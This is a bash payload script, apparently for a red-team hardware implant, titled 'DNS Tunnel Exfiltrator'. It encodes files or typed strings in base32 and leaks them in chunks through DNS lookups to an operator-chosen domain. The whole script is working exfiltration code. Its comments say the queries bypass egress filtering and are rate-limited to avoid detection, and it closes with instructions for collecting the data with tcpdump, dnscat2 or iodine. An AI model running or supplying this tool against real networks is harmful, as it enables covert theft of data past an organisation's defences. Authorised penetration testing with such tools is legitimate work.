#!/bin/bash
# Title: DNS Tunnel Exfiltrator
# Description: Exfiltrate files via DNS queries encoded in subdomains
# Author: Red Team Toolkit
# Version: 1.0
# Category: exfiltration
# Net Mode: NAT
#
# LED States
# - Blue slow blink: Configuring
# - Amber: Encoding data
# - Cyan blink: Sending DNS queries
# - Green: Complete
# - Red: Error
#
# Use Case: Bypass egress filtering by tunneling data through DNS
# Requires: DNS server configured to receive queries (e.g., iodine, dnscat2 receiver)

set -euo pipefail

# Configuration - REPLACE WITH YOUR INFRASTRUCTURE
DNS_DOMAIN="${DNS_DOMAIN:-data.example.com}"
CHUNK_SIZE="${CHUNK_SIZE:-30}"  # Max bytes per DNS label (63 max, but keep smaller)
DELAY_MS="${DELAY_MS:-100}"     # Delay between queries to avoid detection
ARTIFACTS_DIR="${ARTIFACTS_DIR:-/tmp/dns-tunnel}"

have() { command -v "$1" >/dev/null 2>&1; }

cleanup() {
  LED OFF
}
trap cleanup EXIT

encode_hex() {
  local data="$1"
  echo -n "$data" | xxd -p | tr -d '\n'
}

encode_base32() {
  local data="$1"
  if have base32; then
    echo -n "$data" | base32 | tr -d '=' | tr '[:upper:]' '[:lower:]'
  else
    encode_hex "$data"
  fi
}

send_dns_query() {
  local subdomain="$1"
  local full_domain="${subdomain}.${DNS_DOMAIN}"
  
  if have nslookup; then
    nslookup "$full_domain" >/dev/null 2>&1 || true
  elif have dig; then
    dig +short "$full_domain" >/dev/null 2>&1 || true
  elif have host; then
    host "$full_domain" >/dev/null 2>&1 || true
  else
    return 1
  fi
}

exfiltrate_file() {
  local file="$1"
  local filename
  filename=$(basename "$file")
  
  if [[ ! -f "$file" ]]; then
    LOG red "File not found: $file"
    return 1
  fi
  
  local file_size
  file_size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file")
  
  LOG "File: $filename"
  LOG "Size: $file_size bytes"
  LOG ""
  
  # Send header with file metadata
  local header="START.${filename}.${file_size}"
  local header_enc
  header_enc=$(encode_base32 "$header")
  
  LOG "Sending header..."
  send_dns_query "h.${header_enc:0:50}"
  sleep 0.1
  
  LED C SLOW
  
  # Read and send file in chunks
  local chunk_num=0
  local total_chunks=$(( (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE ))
  
  LOG "Sending $total_chunks chunks..."
  
  while IFS= read -r -n "$CHUNK_SIZE" chunk || [[ -n "$chunk" ]]; do
    local chunk_enc
    chunk_enc=$(encode_base32 "$chunk")
    
    # Split encoded data into DNS-safe labels (max 63 chars per label)
    local label1="${chunk_enc:0:60}"
    local label2="${chunk_enc:60:60}"
    
    if [[ -n "$label2" ]]; then
      send_dns_query "d.${chunk_num}.${label1}.${label2}"
    else
      send_dns_query "d.${chunk_num}.${label1}"
    fi
    
    chunk_num=$((chunk_num + 1))
    
    # Progress update every 10 chunks
    if (( chunk_num % 10 == 0 )); then
      local pct=$((chunk_num * 100 / total_chunks))
      LOG "Progress: $chunk_num/$total_chunks ($pct%)"
    fi
    
    # Rate limiting
    sleep "0.${DELAY_MS}"
    
  done < "$file"
  
  # Send footer
  local footer="END.${filename}.${chunk_num}"
  local footer_enc
  footer_enc=$(encode_base32 "$footer")
  send_dns_query "f.${footer_enc:0:50}"
  
  LOG green "Sent $chunk_num chunks"
  return 0
}

exfiltrate_string() {
  local data="$1"
  local label="$2"
  
  local data_enc
  data_enc=$(encode_base32 "$data")
  
  LOG "Exfiltrating string: $label"
  
  # Send in chunks
  local chunk_num=0
  local pos=0
  local len=${#data_enc}
  
  send_dns_query "s.${label}.start"
  
  while (( pos < len )); do
    local chunk="${data_enc:pos:50}"
    send_dns_query "s.${label}.${chunk_num}.${chunk}"
    pos=$((pos + 50))
    chunk_num=$((chunk_num + 1))
    sleep "0.${DELAY_MS}"
  done
  
  send_dns_query "s.${label}.end.${chunk_num}"
  
  LOG green "Sent $chunk_num chunks"
}

show_receiver_info() {
  LOG blue "=== DNS Receiver Setup ==="
  LOG ""
  LOG "On your DNS server, capture queries with:"
  LOG "  tcpdump -n port 53 -l | grep ${DNS_DOMAIN}"
  LOG ""
  LOG "Or use a specialized tool like:"
  LOG "  - dnscat2 server"
  LOG "  - iodine server"
  LOG "  - Custom script parsing subdomain data"
  LOG ""
}

main() {
  LOG blue "=== DNS Tunnel Exfiltrator ==="
  LOG "Exfiltrate data via DNS queries"
  LOG ""
  
  mkdir -p "$ARTIFACTS_DIR"
  
  LED B SLOW
  
  # Check for DNS tools
  if ! have nslookup && ! have dig && ! have host; then
    ERROR_DIALOG "No DNS lookup tools available (nslookup/dig/host)"
    exit 1
  fi
  
  # Configuration
  local domain
  domain=$(TEXT_PICKER "DNS domain" "$DNS_DOMAIN") || true
  case $? in
    "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
      LOG "Cancelled"; exit 1 ;;
  esac
  [[ -n "$domain" ]] && DNS_DOMAIN="$domain"
  
  LOG "Domain: $DNS_DOMAIN"
  LOG ""
  
  # Select mode
  local mode
  mode=$(CONFIRMATION_DIALOG "Exfiltrate a file? (No = string mode)")
  
  if [[ "$mode" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
    # File mode
    local file_path
    file_path=$(TEXT_PICKER "File path" "/tmp/data.txt") || true
    case $? in
      "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
        LOG "Cancelled"; exit 1 ;;
    esac
    
    if [[ ! -f "$file_path" ]]; then
      ERROR_DIALOG "File not found: $file_path"
      exit 1
    fi
    
    LED Y SOLID
    LOG "Encoding file..."
    
    local start_time
    start_time=$(date +%s)
    
    exfiltrate_file "$file_path"
    
    local end_time
    end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    LOG ""
    LOG green "=== Exfiltration Complete ==="
    LOG "Duration: ${duration}s"
    
  else
    # String mode
    local data
    data=$(TEXT_PICKER "Data to exfiltrate" "") || true
    case $? in
      "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
        LOG "Cancelled"; exit 1 ;;
    esac
    
    local label
    label=$(TEXT_PICKER "Label/identifier" "data") || true
    [[ -z "$label" ]] && label="data"
    
    LED Y SOLID
    
    exfiltrate_string "$data" "$label"
    
    LOG ""
    LOG green "=== String Exfiltrated ==="
  fi
  
  LED G SOLID
  
  # Log to artifacts
  {
    echo "=== DNS Tunnel Log ==="
    echo "Time: $(date)"
    echo "Domain: $DNS_DOMAIN"
    echo "Mode: ${mode:-string}"
  } >> "$ARTIFACTS_DIR/exfil_log.txt"
  
  VIBRATE
  show_receiver_info
  
  PROMPT "Press button to exit"
}

main "$@"
